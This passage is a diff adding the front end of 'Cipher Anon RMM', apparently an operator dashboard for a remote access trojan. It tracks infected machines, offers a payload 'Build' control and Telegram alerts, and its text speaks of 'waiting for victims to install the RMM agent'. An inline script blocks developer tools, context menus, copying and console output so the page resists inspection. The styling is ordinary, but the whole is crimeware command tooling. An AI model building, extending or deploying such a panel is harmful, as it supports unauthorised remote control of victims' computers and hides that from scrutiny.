@@ -1,0 +1,1490 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cipher Anon RMM</title>
+
+    <script>
+        (function() {
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'F12') { e.preventDefault(); return false; }
+                if (e.ctrlKey && e.shiftKey && (e.key === 'i' || e.key === 'I')) { e.preventDefault(); return false; }
+                if (e.ctrlKey && e.shiftKey && (e.key === 'j' || e.key === 'J')) { e.preventDefault(); return false; }
+                if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) { e.preventDefault(); return false; }
+            }, true);
+            document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; }, true);
+            document.onselectstart = function() { return false; };
+            document.oncopy = function() { return false; };
+            console.log = function() {};
+            console.warn = function() {};
+            console.error = function() {};
+            console.clear();
+
+            function blockDevtools() {
+                try {
+                    const start = performance.now();
+                    debugger;
+                    const end = performance.now();
+                    if (end - start > 100) {
+                        document.body.innerHTML = '<div style="background:#0a0a0a;color:#ff4444;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;font-size:24px;">🔒 Access Denied</div>';
+                        window.location.reload();
+                    }
+                } catch {}
+            }
+            setInterval(blockDevtools, 1000);
+        })();
+    </script>
+
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: #2a3a5a; border-radius: 2px; }
+
+        body {
+            background: #0a0e1a;
+            color: #e2e8f0;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            user-select: none;
+            -webkit-user-select: none;
+        }
+
+        /* ============================================================
+           SIDEBAR — Modern Glass Style
+           ============================================================ */
+
+        .sidebar {
+            width: 260px;
+            background: rgba(15, 22, 38, 0.95);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border-right: 1px solid rgba(255,255,255,0.04);
+            min-height: 100vh;
+            padding: 20px 14px;
+            flex-shrink: 0;
+            position: sticky;
+            top: 0;
+            height: 100vh;
+            overflow-y: auto;
+            transition: transform 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+            z-index: 100;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .sidebar .logo {
+            padding: 0 6px 18px 6px;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            margin-bottom: 18px;
+        }
+        .sidebar .logo .brand {
+            font-size: 18px;
+            font-weight: 700;
+            color: #00ff88;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            letter-spacing: -0.3px;
+        }
+        .sidebar .logo .brand .icon { font-size: 22px; }
+        .sidebar .logo .brand .highlight { color: #f43f5e; }
+        .sidebar .logo .sub {
+            font-size: 9px;
+            color: #475569;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-top: 2px;
+            padding-left: 4px;
+        }
+        .sidebar .logo .sub span { color: #00ff88; }
+
+        .sidebar .nav-section {
+            font-size: 9px;
+            color: #334155;
+            text-transform: uppercase;
+            letter-spacing: 1.2px;
+            padding: 12px 8px 6px 8px;
+            font-weight: 600;
+        }
+
+        .sidebar .nav-item {
+            padding: 7px 12px;
+            border-radius: 8px;
+            color: #64748b;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-bottom: 1px;
+            font-size: 12.5px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 500;
+            position: relative;
+        }
+        .sidebar .nav-item:hover { background: rgba(255,255,255,0.04); color: #e2e8f0; }
+        .sidebar .nav-item.active {
+            background: rgba(0, 255, 136, 0.08);
+            color: #00ff88;
+            border-left: 2px solid #00ff88;
+        }
+        .sidebar .nav-item .icon { font-size: 15px; width: 20px; text-align: center; flex-shrink: 0; }
+        .sidebar .nav-item .badge {
+            margin-left: auto;
+            background: rgba(0, 255, 136, 0.15);
+            color: #00ff88;
+            font-size: 9px;
+            padding: 1px 8px;
+            border-radius: 12px;
+            font-weight: 600;
+        }
+        .sidebar .nav-item .badge.danger { background: rgba(244, 63, 94, 0.2); color: #f43f5e; }
+        .sidebar .nav-item .badge.warning { background: rgba(251, 191, 36, 0.2); color: #fbbf24; }
+
+        .sidebar .nav-divider {
+            border-top: 1px solid rgba(255,255,255,0.04);
+            margin: 10px 8px;
+        }
+
+        .sidebar .contact-support {
+            margin-top: auto;
+            padding: 8px 12px;
+            border-radius: 8px;
+            background: rgba(0, 136, 204, 0.08);
+            border: 1px solid rgba(0, 136, 204, 0.15);
+            color: #00aaff;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 500;
+            text-decoration: none;
+        }
+        .sidebar .contact-support:hover {
+            background: rgba(0, 136, 204, 0.15);
+            border-color: rgba(0, 136, 204, 0.3);
+            transform: scale(1.02);
+        }
+
+        .sidebar .version {
+            font-size: 9px;
+            color: #1e293b;
+            text-align: center;
+            margin-top: 12px;
+            padding-top: 10px;
+            border-top: 1px solid rgba(255,255,255,0.04);
+        }
+        .sidebar .version span { color: #00ff88; }
+
+        .sidebar-toggle {
+            display: none;
+            position: fixed;
+            top: 12px;
+            left: 12px;
+            z-index: 200;
+            background: rgba(15, 22, 38, 0.9);
+            backdrop-filter: blur(8px);
+            border: 1px solid rgba(255,255,255,0.06);
+            color: #94a3b8;
+            padding: 6px 10px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 18px;
+            transition: 0.2s;
+        }
+        .sidebar-toggle:hover { border-color: rgba(255,255,255,0.15); color: #e2e8f0; }
+
+        .sidebar-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.5);
+            backdrop-filter: blur(4px);
+            z-index: 50;
+        }
+
+        /* ============================================================
+           MAIN CONTENT
+           ============================================================ */
+
+        .main {
+            flex: 1;
+            padding: 20px 28px 28px;
+            min-height: 100vh;
+            max-width: 100%;
+            overflow-x: hidden;
+        }
+
+        /* ---- TOP BAR ---- */
+        .topbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-bottom: 14px;
+            border-bottom: 1px solid rgba(255,255,255,0.04);
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+        .topbar .left h1 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #f1f5f9;
+            letter-spacing: -0.4px;
+        }
+        .topbar .left p {
+            font-size: 13px;
+            color: #64748b;
+            margin-top: 2px;
+        }
+        .topbar .left p .accent { color: #00ff88; }
+
+        .topbar .right {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .topbar .right .btn-build {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 6px 16px;
+            background: linear-gradient(135deg, #00ff88, #00cc77);
+            border: none;
+            border-radius: 8px;
+            color: #0a0e1a;
+            font-weight: 600;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            font-family: inherit;
+        }
+        .topbar .right .btn-build:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(0, 255, 136, 0.25);
+        }
+        .topbar .right .btn-build .icon { font-size: 16px; }
+
+        .topbar .right .live-badge {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 12px;
+            color: #64748b;
+            background: rgba(255,255,255,0.04);
+            padding: 4px 12px;
+            border-radius: 20px;
+            border: 1px solid rgba(255,255,255,0.04);
+        }
+        .topbar .right .live-badge .dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: #00ff88;
+            animation: pulse-dot 1.5s infinite;
+        }
+        @keyframes pulse-dot { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.3; transform: scale(0.8); } }
+
+        .topbar .right .user {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(255,255,255,0.04);
+            padding: 4px 12px 4px 6px;
+            border-radius: 20px;
+            border: 1px solid rgba(255,255,255,0.04);
+            font-size: 12px;
+            color: #e2e8f0;
+        }
+        .topbar .right .user .avatar {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #00ff88, #00cc77);
+            color: #0a0e1a;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 12px;
+        }
+        .topbar .right .icon-btn {
+            background: transparent;
+            border: 1px solid rgba(255,255,255,0.04);
+            color: #64748b;
+            padding: 6px 10px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .topbar .right .icon-btn:hover { border-color: rgba(255,255,255,0.12); color: #e2e8f0; }
+        .topbar .right .icon-btn.danger { border-color: rgba(244, 63, 94, 0.2); color: #f43f5e; }
+        .topbar .right .icon-btn.danger:hover { background: rgba(244, 63, 94, 0.1); }
+
+        /* ---- STATS ROW ---- */
+        .stats-row {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        .stat-card {
+            background: rgba(255,255,255,0.02);
+            border: 1px solid rgba(255,255,255,0.04);
+            border-radius: 12px;
+            padding: 14px 16px;
+            transition: all 0.3s ease;
+        }
+        .stat-card:hover { border-color: rgba(255,255,255,0.08); transform: translateY(-2px); }
+        .stat-card .label { font-size: 10px; color: #475569; text-transform: uppercase; letter-spacing: 0.5px; font-weight: 600; }
+        .stat-card .number { font-size: 26px; font-weight: 700; margin-top: 2px; letter-spacing: -0.3px; }
+        .stat-card .number.green { color: #00ff88; }
+        .stat-card .number.gold { color: #fbbf24; }
+        .stat-card .number.red { color: #f43f5e; }
+        .stat-card .number.purple { color: #8b5cf6; }
+        .stat-card .sub { font-size: 10px; color: #334155; margin-top: 2px; }
+
+        /* ---- FILTER BAR ---- */
+        .filter-bar {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 18px;
+            background: rgba(255,255,255,0.02);
+            border: 1px solid rgba(255,255,255,0.04);
+            border-radius: 12px;
+            padding: 12px 16px;
+            align-items: center;
+        }
+        .filter-bar .filter-group {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            flex-wrap: wrap;
+        }
+        .filter-bar .filter-group label {
+            font-size: 10px;
+            color: #475569;
+            text-transform: uppercase;
+            letter-spacing: 0.4px;
+            font-weight: 600;
+        }
+        .filter-bar .filter-group input,
+        .filter-bar .filter-group select {
+            background: rgba(255,255,255,0.04);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 6px;
+            padding: 5px 10px;
+            color: #e2e8f0;
+            font-size: 12px;
+            font-family: inherit;
+            outline: none;
+            transition: 0.2s;
+            min-width: 120px;
+        }
+        .filter-bar .filter-group input:focus,
+        .filter-bar .filter-group select:focus {
+            border-color: #00ff88;
+            background: rgba(0, 255, 136, 0.04);
+        }
+        .filter-bar .filter-group input::placeholder { color: #334155; }
+        .filter-bar .filter-group select option { background: #0f1626; }
+
+        .filter-bar .btn-filter {
+            padding: 5px 14px;
+            border-radius: 6px;
+            border: 1px solid rgba(255,255,255,0.06);
+            background: rgba(255,255,255,0.04);
+            color: #94a3b8;
+            cursor: pointer;
+            font-size: 11px;
+            transition: 0.2s;
+            font-family: inherit;
+            font-weight: 500;
+        }
+        .filter-bar .btn-filter:hover { border-color: rgba(255,255,255,0.12); color: #e2e8f0; }
+        .filter-bar .btn-filter.primary { border-color: #00ff88; color: #00ff88; }
+        .filter-bar .btn-filter.primary:hover { background: rgba(0, 255, 136, 0.08); }
+
+        /* ---- CLIENT GRID ---- */
+        .clients-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+            gap: 14px;
+            margin-top: 4px;
+        }
+
+        .client-card {
+            background: rgba(255,255,255,0.02);
+            border: 1px solid rgba(255,255,255,0.04);
+            border-radius: 14px;
+            padding: 16px 18px;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        .client-card:hover {
+            border-color: rgba(255,255,255,0.08);
+            transform: translateY(-3px);
+            box-shadow: 0 12px 40px rgba(0,0,0,0.3);
+        }
+        .client-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00ff88, transparent);
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        .client-card:hover::before { opacity: 1; }
+
+        .client-card .card-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 6px;
+        }
+        .client-card .card-header .status-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            flex-shrink: 0;
+        }
+        .client-card .card-header .status-dot.online {
+            background: #00ff88;
+            box-shadow: 0 0 16px rgba(0, 255, 136, 0.3);
+        }
+        .client-card .card-header .status-dot.offline {
+            background: #f43f5e;
+            box-shadow: 0 0 16px rgba(244, 63, 94, 0.2);
+        }
+        .client-card .card-header .pc-name {
+            font-size: 15px;
+            font-weight: 600;
+            color: #f1f5f9;
+        }
+        .client-card .card-header .status-text {
+            font-size: 10px;
+            font-weight: 500;
+            padding: 2px 10px;
+            border-radius: 12px;
+        }
+        .client-card .card-header .status-text.online {
+            background: rgba(0, 255, 136, 0.1);
+            color: #00ff88;
+        }
+        .client-card .card-header .status-text.offline {
+            background: rgba(244, 63, 94, 0.1);
+            color: #f43f5e;
+        }
+        .client-card .card-header .time-ago {
+            margin-left: auto;
+            font-size: 10px;
+            color: #475569;
+        }
+
+        .client-card .card-body {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            font-size: 11px;
+            color: #94a3b8;
+            margin-top: 4px;
+        }
+        .client-card .card-body .flag { font-size: 16px; }
+        .client-card .card-body .ip { font-family: monospace; color: #e2e8f0; }
+        .client-card .card-body .rmm-type {
+            background: rgba(139, 92, 246, 0.1);
+            color: #8b5cf6;
+            padding: 1px 8px;
+            border-radius: 10px;
+            font-size: 9px;
+            font-weight: 600;
+        }
+        .client-card .card-body .client-id {
+            font-size: 9px;
+            color: #334155;
+            font-family: monospace;
+        }
+
+        .client-card .card-actions {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 4px;
+            margin-top: 12px;
+            padding-top: 12px;
+            border-top: 1px solid rgba(255,255,255,0.04);
+        }
+        .client-card .card-actions .btn-sm {
+            padding: 3px 10px;
+            font-size: 9px;
+            border-radius: 6px;
+            border: 1px solid rgba(255,255,255,0.06);
+            background: transparent;
+            color: #64748b;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-weight: 500;
+            font-family: inherit;
+        }
+        .client-card .card-actions .btn-sm:hover {
+            border-color: rgba(255,255,255,0.12);
+            color: #e2e8f0;
+        }
+        .client-card .card-actions .btn-sm.primary { border-color: #00ff88; color: #00ff88; }
+        .client-card .card-actions .btn-sm.primary:hover { background: rgba(0, 255, 136, 0.08); }
+        .client-card .card-actions .btn-sm.gold { border-color: #fbbf24; color: #fbbf24; }
+        .client-card .card-actions .btn-sm.gold:hover { background: rgba(251, 191, 36, 0.08); }
+        .client-card .card-actions .btn-sm.violet { border-color: #8b5cf6; color: #8b5cf6; }
+        .client-card .card-actions .btn-sm.violet:hover { background: rgba(139, 92, 246, 0.08); }
+        .client-card .card-actions .btn-sm.danger { border-color: #f43f5e; color: #f43f5e; }
+        .client-card .card-actions .btn-sm.danger:hover { background: rgba(244, 63, 94, 0.08); }
+
+        .client-card .card-actions .btn-sm .icon { font-size: 10px; }
+
+        /* ---- EMPTY STATE ---- */
+        .empty-state {
+            grid-column: 1/-1;
+            text-align: center;
+            padding: 60px 20px;
+            color: #334155;
+        }
+        .empty-state .icon { font-size: 48px; margin-bottom: 12px; opacity: 0.4; }
+        .empty-state h3 { color: #64748b; font-size: 17px; font-weight: 600; }
+        .empty-state p { font-size: 13px; margin-top: 4px; }
+
+        /* ---- TOAST ---- */
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(15, 22, 38, 0.95);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255,255,255,0.06);
+            padding: 10px 18px;
+            border-radius: 10px;
+            color: #e2e8f0;
+            font-size: 12px;
+            opacity: 0;
+            transform: translateY(16px) scale(0.95);
+            transition: all 0.35s ease;
+            z-index: 2000;
+            max-width: 340px;
+            box-shadow: 0 12px 40px rgba(0,0,0,0.5);
+            font-weight: 500;
+        }
+        .toast.show { opacity: 1; transform: translateY(0) scale(1); }
+        .toast.success { border-color: #00ff88; color: #00ff88; }
+        .toast.error { border-color: #f43f5e; color: #f43f5e; }
+        .toast.warning { border-color: #fbbf24; color: #fbbf24; }
+
+        /* ---- MODALS ---- */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(12px);
+            z-index: 1000;
+            padding: 20px;
+            overflow-y: auto;
+            align-items: center;
+            justify-content: center;
+        }
+        .modal-overlay.active { display: flex; }
+
+        .modal-box {
+            background: linear-gradient(145deg, #111827, #0f1626);
+            max-width: 480px;
+            width: 100%;
+            border-radius: 16px;
+            padding: 28px 24px 24px;
+            border: 1px solid rgba(255,255,255,0.06);
+            box-shadow: 0 20px 80px rgba(0,0,0,0.6);
+            animation: modalIn 0.3s ease;
+        }
+        @keyframes modalIn { 0% { opacity: 0; transform: scale(0.95) translateY(20px); } 100% { opacity: 1; transform: scale(1) translateY(0); } }
+
+        .modal-box .close {
+            float: right;
+            background: none;
+            border: none;
+            color: #475569;
+            font-size: 20px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .modal-box .close:hover { color: #e2e8f0; }
+
+        .modal-box h2 { color: #f1f5f9; font-size: 19px; font-weight: 700; margin-bottom: 6px; }
+        .modal-box p { color: #64748b; font-size: 13px; margin-bottom: 18px; }
+        .modal-box .form-group { margin-bottom: 14px; }
+        .modal-box .form-group label { display: block; font-size: 11px; color: #94a3b8; margin-bottom: 3px; font-weight: 500; }
+        .modal-box .form-group input {
+            width: 100%;
+            padding: 8px 12px;
+            background: rgba(255,255,255,0.04);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 8px;
+            color: #e2e8f0;
+            font-size: 13px;
+            transition: 0.2s;
+            font-family: inherit;
+            outline: none;
+        }
+        .modal-box .form-group input:focus { border-color: #00ff88; background: rgba(0, 255, 136, 0.04); }
+        .modal-box .form-group input::placeholder { color: #334155; }
+        .modal-box .form-group .error-text { font-size: 10px; color: #f43f5e; margin-top: 2px; display: none; }
+        .modal-box .form-group .error-text.show { display: block; }
+        .modal-box .form-group .help-text { font-size: 10px; color: #475569; margin-top: 2px; }
+        .modal-box .form-group .help-text a { color: #00ff88; }
+
+        .modal-box .btn-group { display: flex; gap: 10px; margin-top: 6px; }
+        .modal-box .btn-group .btn { flex: 1; justify-content: center; padding: 8px 14px; font-size: 13px; border-radius: 8px; }
+        .modal-box .btn-group .btn.cancel { border-color: rgba(255,255,255,0.06); color: #94a3b8; background: transparent; }
+        .modal-box .btn-group .btn.cancel:hover { border-color: rgba(255,255,255,0.12); color: #e2e8f0; }
+        .modal-box .btn-group .btn.confirm { border-color: #00ff88; color: #00ff88; background: transparent; }
+        .modal-box .btn-group .btn.confirm:hover { background: rgba(0, 255, 136, 0.08); }
+        .modal-box .btn-group .btn.danger-confirm { border-color: #f43f5e; color: #f43f5e; background: transparent; }
+        .modal-box .btn-group .btn.danger-confirm:hover { background: rgba(244, 63, 94, 0.08); }
+
+        .modal-box .info-text {
+            font-size: 10px;
+            color: #475569;
+            text-align: center;
+            margin-top: 14px;
+            padding-top: 12px;
+            border-top: 1px solid rgba(255,255,255,0.04);
+        }
+        .modal-box .info-text .key { color: #64748b; font-family: monospace; font-size: 9px; }
+
+        .btn {
+            padding: 6px 14px;
+            border-radius: 8px;
+            border: 1px solid rgba(255,255,255,0.06);
+            background: rgba(255,255,255,0.02);
+            color: #94a3b8;
+            cursor: pointer;
+            font-size: 12px;
+            transition: all 0.25s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            font-weight: 500;
+            white-space: nowrap;
+            font-family: inherit;
+        }
+        .btn:hover { border-color: rgba(255,255,255,0.12); background: rgba(255,255,255,0.04); color: #e2e8f0; }
+        .btn.primary { border-color: #00ff88; color: #00ff88; }
+        .btn.primary:hover { background: rgba(0, 255, 136, 0.08); box-shadow: 0 0 30px rgba(0, 255, 136, 0.05); }
+        .btn.danger { border-color: #f43f5e; color: #f43f5e; }
+        .btn.danger:hover { background: rgba(244, 63, 94, 0.08); }
+        .btn.violet { border-color: #8b5cf6; color: #8b5cf6; }
+        .btn.violet:hover { background: rgba(139, 92, 246, 0.08); }
+
+        .view-content { display: none; }
+        .view-content.active { display: block; }
+
+        .powered-footer {
+            text-align: center;
+            font-size: 10px;
+            color: #1e293b;
+            margin-top: 24px;
+            padding-top: 14px;
+            border-top: 1px solid rgba(255,255,255,0.04);
+        }
+        .powered-footer .name { color: #00ff88; font-weight: 600; }
+
+        /* ---- RESPONSIVE ---- */
+        @media (max-width: 768px) {
+            .sidebar {
+                position: fixed;
+                top: 0; left: 0;
+                transform: translateX(-280px);
+                width: 280px;
+                height: 100vh;
+                z-index: 150;
+                border-right: 1px solid rgba(255,255,255,0.04);
+                box-shadow: 4px 0 40px rgba(0,0,0,0.5);
+            }
+            .sidebar.open { transform: translateX(0); }
+            .sidebar-overlay.active { display: block; }
+            .sidebar-toggle { display: block; }
+            .main { padding: 16px; padding-top: 60px; }
+            .topbar .left h1 { font-size: 18px; }
+            .clients-grid { grid-template-columns: 1fr; }
+            .stats-row { grid-template-columns: repeat(2, 1fr); }
+            .filter-bar { flex-direction: column; align-items: stretch; }
+            .filter-bar .filter-group { flex-wrap: wrap; }
+            .filter-bar .filter-group input { min-width: 100%; }
+            .modal-box { padding: 20px 16px; }
+            .modal-box .btn-group { flex-direction: column; }
+        }
+
+        @media (max-width: 480px) {
+            .stats-row { grid-template-columns: 1fr 1fr; }
+            .stats-row .stat-card .number { font-size: 20px; }
+            .topbar .right .btn-build { font-size: 11px; padding: 4px 12px; }
+            .topbar .right .user { font-size: 11px; }
+            .client-card { padding: 14px; }
+            .client-card .card-actions .btn-sm { font-size: 8px; padding: 2px 8px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- MOBILE SIDEBAR TOGGLE -->
+    <button class="sidebar-toggle" id="sidebarToggle" onclick="toggleSidebar()">☰</button>
+    <div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar()"></div>
+
+    <!-- SIDEBAR -->
+    <div class="sidebar" id="sidebar">
+        <div class="logo">
+            <div class="brand">
+                <span class="icon">📡</span>
+                Cipher <span class="highlight">Anon</span>
+            </div>
+            <div class="sub">RMM <span>Control</span> Panel</div>
+        </div>
+
+        <div class="nav-item active" data-view="rmm" id="navRmm">
+            <span class="icon">📡</span>
+            All Machines
+            <span class="badge" id="sidebarTotal">0</span>
+        </div>
+        <div class="nav-item" data-view="online" id="navOnline">
+            <span class="icon">🟢</span>
+            Host Connected
+            <span class="badge" id="sidebarOnline">0</span>
+        </div>
+        <div class="nav-item" data-view="offline" id="navOffline">
+            <span class="icon">🔴</span>
+            Guest Connected
+            <span class="badge danger" id="sidebarOffline">0</span>
+        </div>
+
+        <div class="nav-divider"></div>
+        <div class="nav-section">Filters</div>
+
+        <div class="nav-item" data-view="recent" id="navRecent">
+            <span class="icon">🕐</span>
+            Recently Accessed
+        </div>
+        <div class="nav-item" data-view="outdated" id="navOutdated">
+            <span class="icon">⚠️</span>
+            Outdated Clients
+            <span class="badge warning" id="sidebarOutdated">0</span>
+        </div>
+
+        <div class="nav-divider"></div>
+
+        <a href="https://t.me/nullrouterot13" target="_blank" class="contact-support">
+            <span class="icon">📱</span> Telegram Support
+        </a>
+
+        <div class="version">
+            <span>●</span> v3.0 · RMM <span>●</span>
+        </div>
+    </div>
+
+    <!-- MAIN CONTENT -->
+    <div class="main" id="mainContent">
+
+        <div class="topbar">
+            <div class="left">
+                <h1 id="pageTitle">Access</h1>
+                <p id="pageSub">Install an agent and connect to unattended devices.</p>
+            </div>
+            <div class="right">
+                <button class="btn-build" onclick="openSettings()">
+                    <span class="icon">⚡</span> Build +
+                </button>
+                <div class="live-badge">
+                    <span class="dot"></span>
+                    Live
+                </div>
+                <button class="icon-btn" onclick="fetchRmmClients()">🔄</button>
+                <button class="icon-btn" onclick="openSettings()">⚙️</button>
+                <button class="icon-btn danger" onclick="showLogoutConfirm()">🚪</button>
+                <div class="user">
+                    <div class="avatar">A</div>
+                    Admin
+                </div>
+            </div>
+        </div>
+
+        <!-- STATS ROW -->
+        <div class="stats-row" id="statsRow">
+            <div class="stat-card">
+                <div class="label">Total Machines</div>
+                <div class="number gold" id="statTotal">0</div>
+                <div class="sub">All clients</div>
+            </div>
+            <div class="stat-card">
+                <div class="label">Host Connected</div>
+                <div class="number green" id="statOnline">0</div>
+                <div class="sub">🟢 Online</div>
+            </div>
+            <div class="stat-card">
+                <div class="label">Guest Connected</div>
+                <div class="number red" id="statOffline">0</div>
+                <div class="sub">🔴 Offline</div>
+            </div>
+            <div class="stat-card">
+                <div class="label">Outdated</div>
+                <div class="number purple" id="statOutdated">0</div>
+                <div class="sub">⚠️ Needs update</div>
+            </div>
+        </div>
+
+        <!-- FILTER BAR -->
+        <div class="filter-bar" id="filterBar">
+            <div class="filter-group">
+                <label>🔍 Name</label>
+                <input type="text" id="filterName" placeholder="Search machines..." oninput="applyFilters()" />
+            </div>
+            <div class="filter-group">
+                <label>Company</label>
+                <select id="filterCompany" onchange="applyFilters()">
+                    <option value="">All</option>
+                    <option value="CipherAnon">CipherAnon</option>
+                </select>
+            </div>
+            <div class="filter-group">
+                <label>Device Type</label>
+                <select id="filterDevice" onchange="applyFilters()">
+                    <option value="">All</option>
+                    <option value="Windows">Windows</option>
+                    <option value="macOS">macOS</option>
+                    <option value="Linux">Linux</option>
+                </select>
+            </div>
+            <button class="btn-filter primary" onclick="applyFilters()">Apply</button>
+            <button class="btn-filter" onclick="resetFilters()">Reset</button>
+        </div>
+
+        <!-- RMM CLIENTS VIEW -->
+        <div class="view-content active" id="viewRmm">
+            <div class="clients-grid" id="clientsGrid">
+                <div class="empty-state">
+                    <div class="icon">📡</div>
+                    <h3>No RMM clients connected</h3>
+                    <p>Waiting for victims to install the RMM agent...</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="powered-footer">
+            Powered By <span class="name">CipherAnon</span>
+        </div>
+    </div>
+
+    <!-- SETTINGS MODAL -->
+    <div class="modal-overlay" id="settingsOverlay">
+        <div class="modal-box">
+            <button class="close" onclick="closeSettings()">✕</button>
+            <h2>⚙️ Build Settings</h2>
+            <p>Configure your RMM deployment settings.</p>
+
+            <div style="border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:14px;margin-bottom:14px;">
+                <div class="form-group">
+                    <label>Current Password</label>
+                    <input type="password" id="oldPassword" placeholder="Current password" />
+                    <div class="error-text" id="oldPasswordError">Incorrect</div>
+                </div>
+                <div class="form-group">
+                    <label>New Password</label>
+                    <input type="password" id="newPassword" placeholder="Min 4 chars" />
+                    <div class="error-text" id="newPasswordError">Min 4 chars</div>
+                </div>
+                <div class="form-group">
+                    <label>Confirm</label>
+                    <input type="password" id="confirmPassword" placeholder="Confirm" />
+                    <div class="error-text" id="confirmPasswordError">No match</div>
+                </div>
+                <button class="btn primary" onclick="changePassword()" style="width:100%;justify-content:center;">Change Password</button>
+            </div>
+
+            <div>
+                <div class="form-group">
+                    <label>Telegram Bot Token</label>
+                    <input type="text" id="telegramToken" placeholder="Token from @BotFather" />
+                    <div class="help-text"><a href="https://t.me/BotFather" target="_blank">@BotFather</a></div>
+                </div>
+                <div class="form-group">
+                    <label>Telegram Chat ID</label>
+                    <input type="text" id="telegramChatId" placeholder="Chat ID" />
+                    <div class="help-text"><a href="https://t.me/userinfobot" target="_blank">@userinfobot</a></div>
+                </div>
+                <div class="form-group" style="display:flex;align-items:center;gap:8px;">
+                    <label style="margin-bottom:0;cursor:pointer;">📬 Send notifications</label>
+                    <input type="checkbox" id="telegramNotifications" style="width:18px;height:18px;accent-color:#00ff88;cursor:pointer;" checked />
+                </div>
+                <button class="btn primary" onclick="updateTelegramSettings()" style="width:100%;justify-content:center;">Save Telegram Settings</button>
+            </div>
+
+            <div class="info-text">
+                Username: <span class="key">admin</span> · Settings saved to config.json
+            </div>
+        </div>
+    </div>
+
+    <!-- LOGOUT CONFIRM -->
+    <div class="modal-overlay" id="logoutConfirmOverlay">
+        <div class="modal-box" style="max-width:360px;text-align:center;">
+            <div style="font-size:48px;margin-bottom:8px;">🚪</div>
+            <h2>Confirm Logout</h2>
+            <p>You will need to login again.</p>
+            <div class="btn-group" style="flex-direction:row;">
+                <button class="btn cancel" onclick="hideLogoutConfirm()" style="flex:1;">Cancel</button>
+                <button class="btn danger-confirm" onclick="executeLogout()" style="flex:1;">Logout</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- CUSTOM CONFIRM -->
+    <div class="modal-overlay" id="customConfirmOverlay">
+        <div class="modal-box" style="max-width:360px;text-align:center;">
+            <div style="font-size:48px;margin-bottom:8px;" id="confirmIcon">⚠️</div>
+            <h2 id="confirmTitle">Confirm</h2>
+            <p id="confirmMessage">Are you sure?</p>
+            <div class="btn-group" style="flex-direction:row;">
+                <button class="btn cancel" onclick="hideCustomConfirm()" style="flex:1;">Cancel</button>
+                <button class="btn confirm" id="confirmActionBtn" onclick="executeConfirmAction()" style="flex:1;">Confirm</button>
+            </div>
